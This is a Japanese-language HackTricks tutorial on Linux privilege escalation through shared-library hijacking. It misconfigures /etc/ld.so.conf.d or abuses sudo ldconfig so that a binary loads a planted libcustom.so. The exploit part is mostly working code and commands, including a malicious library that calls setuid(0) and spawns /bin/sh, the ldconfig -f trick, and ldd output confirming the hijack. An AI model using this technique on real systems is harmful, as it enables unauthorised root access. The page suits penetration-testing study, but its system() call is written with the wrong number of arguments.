# ld.so privesc exploit の例

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
* **HackTricks** にあなたのハッキングのコツを PR として提出して、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリを共有する。

</details>

## 環境の準備

以下のセクションでは、環境を準備するために使用するファイルのコードを見つけることができます

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. 同じフォルダ内にこれらのファイルを**作成**してください
2. **ライブラリをコンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`を`/usr/lib`に**コピー**します: `sudo cp libcustom.so /usr/lib` (root権限)
4. **実行ファイルをコンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境をチェック

_libcustom.so_が_/usr/lib_から**ロード**されていることと、バイナリを**実行**できることを確認してください。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## エクスプロイト

このシナリオでは、**誰かが_/etc/ld.so.conf/_ 内のファイルに脆弱なエントリを作成した**と仮定します。
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダは _/home/ubuntu/lib_ です（書き込み可能なアクセス権があります）。\
**以下のコードをダウンロードしてコンパイル** してください。そのパス内で：
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
作成した悪意のある **libcustom ライブラリが誤設定されたパス内にある** ため、**再起動**を待つか、root ユーザーが **`ldconfig`** を実行するのを待つ必要があります（**sudo** としてこのバイナリを実行できる場合や、**suid ビット**が設定されている場合は、自分で実行できます）。

これが行われたら、`sharevuln` 実行ファイルが `libcustom.so` ライブラリをどこからロードしているかを**再確認**してください：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
以下のように、**`/home/ubuntu/lib`からロードしています**。そして、ユーザーが実行すると、シェルが実行されます：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
この例では権限昇格は行っていませんが、実行されるコマンドを変更し、**rootまたは他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで、権限を昇格させることができます。
{% endhint %}

### その他の誤設定 - 同じ脆弱性

前の例では、管理者が`/etc/ld.so.conf.d/`内の設定ファイルに**非特権フォルダを設定する**という誤設定を行いました。\
しかし、`/etc/ld.so.conf.d`内の**設定ファイル**に**書き込み権限**がある場合、`/etc/ld.so.conf.d`フォルダや`/etc/ld.so.conf`ファイルに同じ脆弱性を設定し、それを利用することができます。

## Exploit 2

**`ldconfig`に対してsudo権限を持っているとします。**\
`ldconfig`に**どこからconfファイルを読み込むか**を指示できるので、任意のフォルダを`ldconfig`に読み込ませることを利用できます。\
では、"/tmp"を読み込むために必要なファイルとフォルダを作成しましょう。
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
前の**エクスプロイト**で示されたように、`/tmp`内に**悪意のあるライブラリを作成します**。\
そして最後に、パスをロードして、バイナリがどこからライブラリをロードしているかを確認しましょう:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**`ldconfig`に対するsudo権限を持っている場合、同じ脆弱性を悪用できることがわかります。**

{% hint style="info" %}
**suidビット**が設定されている`ldconfig`を悪用する信頼性の高い方法は**見つかりませんでした**。次のエラーが表示されます：`/sbin/ldconfig.real: 一時キャッシュファイル /etc/ld.so.cache~ を作成できません: 許可が拒否されました`
{% endhint %}

## 参考文献

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTBのDab machine

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローになる方法を学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
